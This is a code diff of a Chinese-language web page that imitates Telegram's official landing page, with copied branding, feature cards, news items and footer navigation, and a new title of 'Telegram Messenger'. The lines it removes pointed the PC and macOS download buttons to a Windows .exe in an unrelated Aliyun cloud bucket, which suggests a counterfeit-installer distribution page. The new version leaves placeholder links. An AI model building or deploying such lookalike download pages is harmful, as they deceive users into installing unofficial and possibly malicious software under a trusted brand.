@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram 风格官方落地页</title>
+    <title>Telegram Messenger</title>
     <style>
         /* 基础样式复位 */
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -39,28 +39,21 @@
         }
         .nav-right { color: #777777; }
 
-        /* 主体布局（左边主内容，右边侧边栏） */
+        /* 主体布局 */
         main {
             max-width: 1100px;
             margin: 0 auto;
             padding: 60px 24px;
             display: flex;
-            flex-wrap: wrap;
-            gap: 50px;
+            flex-direction: column;
+            gap: 60px;
         }
         .content-left {
-            flex: 3;
-            min-width: 300px;
+            width: 100%;
             display: flex;
             flex-direction: column;
             align-items: center;
             text-align: center;
-        }
-        .sidebar-right {
-            flex: 1;
-            min-width: 240px;
-            border-left: 1px solid #f7f7f7;
-            padding-left: 24px;
         }
 
         /* 品牌核心区 */
@@ -96,19 +89,6 @@
             max-width: 650px;
             margin-bottom: 60px;
         }
-        .mockup-phone {
-            width: 220px;
-            height: 380px;
-            background-color: #f5f5f5;
-            border: 4px solid #333333;
-            border-radius: 30px;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.08);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #999999;
-            font-size: 12px;
-        }
         .device-item {
             display: flex;
             flex-direction: column;
@@ -126,65 +106,190 @@
             flex-direction: column;
             align-items: center;
         }
-       .mockup-pc {
-    width: 100%;
-    height: auto;
-    background-color: transparent;
-    border: none;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    box-shadow: none;
-}
-
-        .pc-base {
-            width: 106%;
-            height: 10px;
-            background-color: #b0b0b0;
-            border-radius: 0 0 10px 10px;
-            margin-bottom: 20px;
+        .mockup-pc {
+            width: 100%;
+            height: auto;
+            background-color: transparent;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: none;
         }
-        .pc-links { display: flex; gap: 40px; font-size: 14px; font-weight: 500; }
+        .pc-links { display: flex; gap: 40px; font-size: 14px; font-weight: 500; margin-top: 15px; }
 
-        /* 侧边栏新闻 */
-        .sidebar-title { font-size: 13px; color: #24A1DE; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; font-weight: bold; }
-        .news-item { margin-bottom: 25px; }
-        .news-date { font-size: 12px; color: #999999; font-weight: bold; margin-bottom: 4px; }
-        .news-text { font-size: 14px; color: #555555; }
+        /* 新闻并排样式 */
+        .sidebar-right {
+            width: 100%;
+            margin-top: 20px;
+        }
+        .sidebar-title { 
+            font-size: 16px; 
+            color: #24A1DE; 
+            text-transform: uppercase; 
+            letter-spacing: 1px; 
+            margin-bottom: 30px; 
+            font-weight: bold; 
+            text-align: center; 
+        }
+        .news-grid-container {
+            display: flex;
+            gap: 50px;
+            justify-content: center;
+            align-items: flex-start;
+        }
+        .news-item { 
+            flex: 1;
+            max-width: 480px;      
+            display: flex;
+            flex-direction: column;
+            text-align: center;    
+        }
+        .news-img {
+            width: 100%;           
+            max-width: 380px;      
+            height: auto;
+            border-radius: 12px;
+            margin: 0 auto 15px auto; 
+            display: block;
+        }
+        .news-headline { 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: #24A1DE; 
+            margin-bottom: 8px; 
+            line-height: 1.4; 
+        }
+        .news-text { 
+            font-size: 13px; 
+            color: #666666; 
+            line-height: 1.6;
+            margin-bottom: 6px;
+        }
+        .news-date { 
+            font-size: 12px; 
+            color: #999999; 
+            font-weight: bold; 
+        }
 
-        /* 底部特性展示区 */
+        /* 底部九宫格与页脚联合大区块 */
         footer {
-            background-color: #fafafa;
+            background-color: #ffffff;
             border-top: 1px solid #f0f0f0;
-            padding: 60px 24px;
+            padding: 80px 24px 60px 24px;
             text-align: center;
         }
-        .footer-title { font-size: 20px; color: #111111; margin-bottom: 30px; font-weight: bold; }
+        .footer-title { font-size: 24px; color: #111111; margin-bottom: 50px; font-weight: bold; }
+        
+        /* 升级为 3列 网格布局支撑 9个卡片 */
         .grid-cards {
-            max-width: 850px;
-            margin: 0 auto;
+            max-width: 950px;
+            margin: 0 auto 80px auto; 
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
+            grid-template-columns: repeat(3, 1fr); 
+            gap: 60px 40px; 
         }
         .card {
             background: #ffffff;
-            padding: 24px;
-            border-radius: 16px;
-            border: 1px solid #eeeeee;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.02);
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
-        .card-img {
-            height: 140px;
-            background-color: #f4f9fc;
-            border-radius: 10px;
+        .card-img-box {
+            height: 120px;
             margin-bottom: 15px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 40px;
         }
-        .card-text { font-size: 14px; color: #555555; font-weight: 500; }
+        .card-img-box img {
+            max-height: 100%;
+            width: auto;
+            object-fit: contain;
+        }
+        .card-h3 { font-size: 18px; color: #24A1DE; margin-bottom: 10px; font-weight: bold; }
+        .card-text { font-size: 14px; color: #666666; line-height: 1.6; max-width: 280px; }
+
+        /* 完美还原：最底部五列导航样式 */
+        .footer-nav {
+            max-width: 950px;
+            margin: 0 auto;
+            border-top: 1px solid #f0f0f0;
+            padding-top: 40px;
+            display: grid;
+            grid-template-columns: 2fr repeat(4, 1fr); /* 第一列电报介绍稍宽，其余四列平分 */
+            gap: 30px;
+            text-align: left;
+        }
+        .nav-col h4 {
+            font-size: 14px;
+            color: #111111;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+        .nav-col p {
+            font-size: 12px;
+            color: #777777;
+            line-height: 1.8;
+        }
+        .nav-col ul {
+            list-style: none;
+        }
+        .nav-col ul li {
+            margin-bottom: 8px;
+        }
+        .nav-col ul li a {
+            font-size: 13px;
+            color: #24A1DE;
+        }
+        .nav-col ul li a:hover {
+            text-decoration: underline;
+        }
+/* 让动画盒子内的多张图片重叠在一起 */
+.duck-animation {
+    position: relative;
+    width: 140px;
+    height: 140px;
+}
+.duck-animation img {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    opacity: 0; /* 默认全部隐藏 */
+    animation: rotateImages 3s infinite; /* 3秒播放一轮，无限循环 */
+}
+
+/* 为每张图片设置动画延迟时间，错开显示 */
+.duck-animation img:nth-child(1) { animation-delay: 0s; }
+.duck-animation img:nth-child(2) { animation-delay: 1s; } 
+.duck-animation img:nth-child(3) { animation-delay: 2s; } 
+
+/* 定义轮流显示的动画轨迹 */
+@keyframes rotateImages {
+    0%, 33.33% { opacity: 1; }  
+    33.34%, 100% { opacity: 0; } 
+}
+        /* 移动端屏幕自适应适配 */
+        @media (max-width: 768px) {
+            .news-grid-container {
+                flex-direction: column; 
+                align-items: center;
+                gap: 40px;
+            }
+            .grid-cards {
+                grid-template-columns: 1fr; 
+                gap: 40px;
+            }
+            .footer-nav {
+                grid-template-columns: 1fr;
+                gap: 30px;
+                padding-left: 20px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -207,7 +312,7 @@
 
     <!-- 2. 主体内容区域 -->
     <main>
-        <!-- 左侧：核心品牌与产品展示 -->
+        <!-- 上半部分：品牌核心区 -->
         <div class="content-left">
             <div class="logo-box">
                 <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
@@ -220,10 +325,8 @@
             
             <a href="#" class="cta-btn">▶ 打开 Telegram 网页版</a>
 
-                        <!-- 手机端展示 -->
+            <!-- 手机端展示 -->
             <div class="device-container" style="display: flex; gap: 40px; justify-content: center; width: 100%; max-width: 650px; margin-bottom: 60px; align-items: flex-end;">
-                
-                <!-- Android 版容器 -->
                 <div class="device-item" style="display: flex; flex-direction: column; align-items: center; flex: 1;">
                     <div style="width: 100%; height: 280px; display: flex; align-items: center; justify-content: center;">
                         <img src="android-screen.png" alt="Telegram Android 版" style="max-width: 100%; max-height: 100%; object-fit: contain; display: block;">
@@ -231,66 +334,202 @@
                     <span style="margin-top: 15px; font-size: 14px; font-weight: 500;"><a href="#">🤖 Telegram Android 版</a></span>
                 </div>
                 
-                <!-- iPhone / iPad 版容器 -->
                 <div class="device-item" style="display: flex; flex-direction: column; align-items: center; flex: 1;">
                     <div style="width: 100%; height: 280px; display: flex; align-items: center; justify-content: center;">
                         <img src="ios-screen.png" alt="Telegram iPhone / iPad 版" style="max-width: 100%; max-height: 100%; object-fit: contain; display: block;">
                     </div>
+
                     <span style="margin-top: 15px; font-size: 14px; font-weight: 500;"><a href="#">🍏 Telegram iPhone / iPad 版</a></span>
                 </div>
-
             </div>
 
-
-
-                       <!-- 电脑端展示 -->
+            <!-- PC端展示 -->
             <div class="pc-container">
-                <div class="mockup-pc" style="padding: 0; overflow: hidden; background-color: transparent;">
-                    <img src="pc-screen.png" alt="Telegram PC / Mac 版" style="width: 100%; height: 100%; object-fit: cover; display: block;">
+                <div class="mockup-pc">
+                    <img src="pc-screen.png" alt="Telegram PC客户端" style="max-width: 100%; height: auto; display: block;">
                 </div>
-                <div class="pc-base"></div>
                 <div class="pc-links">
-                    <a href="https://sszz11.oss-ap-southeast-1.aliyuncs.com/tsetup-x64.7.1.1.exe">Telegram PC / Linux 版</a>
-                    <a href="https://sszz11.oss-ap-southeast-1.aliyuncs.com/tsetup-x64.7.1.1.exe">Telegram macOS 版</a>
+                    <a href="#">💻 Telegram WP/Mac/Linux 版</a> &nbsp;&nbsp;&nbsp;&nbsp;
+                    <a href="#">💻 Telegram macOS 专用版</a>
                 </div>
             </div>
+        </div>
 
-
-        <!-- 右侧：最新消息侧边栏 -->
+        <!-- 下半部分：最新消息（横向并排） -->
         <div class="sidebar-right">
             <div class="sidebar-title">最新消息</div>
             
-            <div class="news-item">
-                <div class="news-date">6月11日</div>
-                <div class="news-text">智能手机应用、机器人富文本、群组 AI 守护者，以及更多功能。</div>
-            </div>
+            <div class="news-grid-container">
+                <!-- 新闻 1 -->
+                <div class="news-item">
+                    <img src="news1.png" alt="智能手表应用" class="news-img">
+                    <div class="news-headline"><a href="#">智能手表应用、机器人富文本、群组 AI 守护者，以及更多功能</a></div>
+                    <div class="news-text">今天的更新让 Telegram 登上 Apple Watch 和 Android 智能手表，加入机器人富文本，并让 AI 管理员筛选新的群组成员...</div>
+                    <div class="news-date">2026 年 6 月 11 日</div>
+                </div>
 
-            <div class="news-item">
-                <div class="news-date">5月7日</div>
-                <div class="news-text">访客 AI 机器人、机器人回顾聊天、聊天自动化、自定义 AI 风格、1 亿+ 表情包贴纸赛事等。</div>
-            </div>
-
-            <div class="news-item">
-                <div class="news-date">3月31日</div>
-                <div class="news-text">AI 编辑器、强大效果、实现照片、由机器人管理的人工智能等。</div>
+                <!-- 新闻 2 -->
+                <div class="news-item">
+                    <img src="news2.png" alt="访客 AI 机器人" class="news-img">
+                    <div class="news-headline"><a href="#">访客 AI 机器人、机器人间聊天、聊天自动化、自定义 AI 风格、1 亿+ 表情和贴纸搜索等</a></div>
+                    <div class="news-text">Telegram 新增 10 多项功能，包括让用户从任意聊天的访问 AI 服务的方式...</div>
+                    <div class="news-date">2026 年 5 月 7 日</div>
+                </div>
             </div>
         </div>
     </main>
 
-    <!-- 3. 底部特性展示区 -->
+    <!-- 3. 底部特性与多列导航区 -->
     <footer>
-        <div class="footer-title">最新动态</div>
+        <div class="footer-title">为什么选择 Telegram？</div>
+        
+        <!-- 九宫格卡片排列 -->
         <div class="grid-cards">
-            <div class="card">
-                <div class="card-img">🎨</div>
-                <div class="card-text">丰富的个性化主题与动态插画支持</div>
+            <!-- 卡片 1 -->
+                    <!-- 卡片 1 -->
+        <div class="card">
+            <!-- 1. 这里加上了 duck-animation -->
+            <div class="card-img-box duck-animation">
+                <!-- 2. 这里塞入你想轮流播放的 3 张照片名字 -->
+                <img src="duck1_1.png" alt="简单的-图1">
+                <img src="duck1_2.png" alt="简单的-图2">
+                <img src="duck1_3.png" alt="简单的-图3">
             </div>
-            <div class="card">
-                <div class="card-img">🤖</div>
-                <div class="card-text">下一代强大的 AI 机器人开放生态</div>
+            <div class="card-h3">简单的</div>
+            <div class="card-text">Telegram非常简单，你肯定已经知道如何使用了。</div>
+        </div>
+
+                    <!-- 卡片 2 -->
+        <div class="card">
+            <div class="card-img-box duck-animation">
+                <img src="duck2_1.png" alt="私人的-图1">
+                <img src="duck2_2.png" alt="私人的-图2">
+                <img src="duck2_3.png" alt="私人的-图3">
+            </div>
+            <div class="card-h3">私人的</div>
+            <div class="card-text">Telegram消息经过高度加密，并且可以自动销毁。</div>
+        </div>
+
+        <!-- 卡片 3 -->
+        <div class="card">
+            <div class="card-img-box duck-animation">
+                <img src="duck3_1.png" alt="已同步-图1">
+                <img src="duck3_2.png" alt="已同步-图2">
+                <img src="duck3_3.png" alt="已同步-图3">
+            </div>
+            <div class="card-h3">已同步</div>
+            <div class="card-text">Telegram允许您从多个设备访问您的聊天记录。</div>
+        </div>
+
+        <!-- 卡片 4 -->
+        <div class="card">
+            <div class="card-img-box duck-animation">
+                <img src="duck4_1.png" alt="快速地-图1">
+                <img src="duck4_2.png" alt="快速地-图2">
+                <img src="duck4_3.png" alt="快速地-图3">
+            </div>
+            <div class="card-h3">快速地</div>
+            <div class="card-text">Telegram 的消息传递速度比任何其他应用程序都快。</div>
+        </div>
+
+        <!-- 卡片 5 -->
+        <div class="card">
+            <div class="card-img-box duck-animation">
+                <img src="duck5_1.png" alt="强大的-图1">
+                <img src="duck5_2.png" alt="强大的-图2">
+                <img src="duck5_3.png" alt="强大的-图3">
+            </div>
+            <div class="card-h3">强大的</div>
+            <div class="card-text">Telegram对媒体文件和聊天记录的大小没有限制。</div>
+        </div>
+
+        <!-- 卡片 6 -->
+        <div class="card">
+            <div class="card-img-box duck-animation">
+                <img src="duck6_1.png" alt="打开-图1">
+                <img src="duck6_2.png" alt="打开-图2">
+                <img src="duck6_3.png" alt="打开-图3">
+            </div>
+            <div class="card-h3">打开</div>
+            <div class="card-text">Telegram拥有开放的API和源代码，供所有人免费使用。</div>
+        </div>
+
+        <!-- 卡片 7 -->
+        <div class="card">
+            <div class="card-img-box duck-animation">
+                <img src="duck7_1.png" alt="安全的-图1">
+                <img src="duck7_2.png" alt="安全的-图2">
+                <img src="duck7_3.png" alt="安全的-图3">
+            </div>
+            <div class="card-h3">安全的</div>
+            <div class="card-text">Telegram能保护您的消息免受黑客攻击。</div>
+        </div>
+
+        <!-- 卡片 8 -->
+        <div class="card">
+            <div class="card-img-box duck-animation">
+                <img src="duck8_1.png" alt="社会的-图1">
+                <img src="duck8_2.png" alt="社会的-图2">
+                <img src="duck8_3.png" alt="社会的-图3">
+            </div>
+            <div class="card-h3">社会的</div>
+            <div class="card-text">Telegram群组最多可容纳 20 万名成员。</div>
+        </div>
+
+        <!-- 卡片 9 -->
+        <div class="card">
+            <div class="card-img-box duck-animation">
+                <img src="duck9_1.png" alt="富有表现力-图1">
+                <img src="duck9_2.png" alt="富有表现力-图2">
+                <img src="duck9_3.png" alt="富有表现力-图3">
+            </div>
+            <div class="card-h3">富有表现力</div>
+            <div class="card-text">Telegram允许您完全自定义您的即时通讯工具。</div>
+        </div>
+
+        </div>
+
+        <!-- 最底部五列菜单栏 -->
+        <div class="footer-nav">
+            <div class="nav-col">
+                <h4>电报</h4>
+                <p>Telegram 是一款基于云端的移动和桌面即时通讯应用，注重安全性和速度。</p>
+            </div>
+            <div class="nav-col">
+                <h4>关于</h4>
+                <ul>
+                    <li><a href="#">常见问题</a></li>
+                    <li><a href="#">隐私</a></li>
+                    <li><a href="#">按</a></li>
+                </ul>
+            </div>
+            <div class="nav-col">
+                <h4>移动应用</h4>
+                <ul>
+                    <li><a href="#">iPhone/iPad</a></li>
+                    <li><a href="#">安卓</a></li>
+                    <li><a href="#">移动网页</a></li>
+                </ul>
+            </div>
+            <div class="nav-col">
+                <h4>桌面应用程序</h4>
+                <ul>
+                    <li><a href="#">PC/Mac/Linux</a></li>
+                    <li><a href="#">macOS</a></li>
+                    <li><a href="#">网络浏览器</a></li>
+                </ul>
+            </div>
+            <div class="nav-col">
+                <h4>平台</h4>
+                <ul>
+                    <li><a href="#">API</a></li>
+                    <li><a href="#">翻译</a></li>
+                    <li><a href="#">即时查看</a></li>
+                </ul>
             </div>
         </div>
     </footer>
 
 </body>
 </html>
+
